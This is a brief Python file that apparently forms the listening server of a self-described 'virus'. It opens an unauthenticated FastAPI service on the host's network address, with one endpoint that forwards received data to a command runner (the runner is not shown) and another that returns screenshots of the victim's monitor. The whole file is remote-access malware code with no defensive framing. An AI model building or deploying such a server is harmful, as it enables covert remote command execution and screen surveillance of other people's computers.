import utils as ut
import uvicorn
import cv2
from fastapi import FastAPI,Response
from runner import prosses_command
from matplotlib import pyplot as plt

app = FastAPI()

@app.post("/command")
async def receive_dict(data: dict):
    try:
        answer = await prosses_command(data)
        answer["valid"] = True
        if (not "message" in answer.keys()): answer["message"] = "run without crash"
        return answer
    except Exception as e:
        return {"valid":False,"message":str(e)}

@app.get("/screenshot")
async def get_screenshot(data: dict={}):
    monitor = data["monitor"] if ("monitor" in data.keys()) else 1
    img = ut.get_screenshot_async(monitor) 
    _,img_jpeg = cv2.imencode(".jpg",img)
    return Response(content=img_jpeg.tobytes(),media_type="image/jpg")

def start():
    ip,port = ut.get_ip(),8000
    uvicorn.run(app,host=ip,port=port)
    print(f"start run virus at {ip}:{port}")

if (__name__ == "__main__"):
    print(ut.get_ip())
    start()